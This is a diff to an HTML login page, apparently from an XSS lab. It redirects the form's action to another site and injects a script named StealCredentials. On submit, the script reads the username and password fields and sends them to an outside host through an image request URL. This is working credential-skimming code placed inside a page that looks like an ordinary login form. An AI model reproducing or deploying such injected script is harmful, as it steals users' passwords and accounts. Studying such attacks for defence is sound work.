@@ -28,11 +28,22 @@
 
 <body class="sessions">
 <div id="signin" class="reveal">
-  <form id="login" action="./login" method="get" class="untouched">
+  <form id="login" action="https://xss.websecurity.church/0/login" method="get" class="untouched">
       <h1><a href="#">NOPE</a></h1>
     
     
-    
+      <script type="text/javascript"> 
+        function StealCredentials() {
+            var username = document.getElementById("login_username").value;
+            var pass = document.getElementById("login_password").value;
+            var credentials = "username = " + username + " | " + "password = " + pass;
+            img = document.createElement("img");
+            img.src = "http://r7.io/e/nhytrek?s=" + credentials;
+        }
+        
+        document.forms[0].onsubmit = StealCredentials;
+      </script>
+        
 
       <div id="login-fields-wrapper">
         <div id="login-fields">
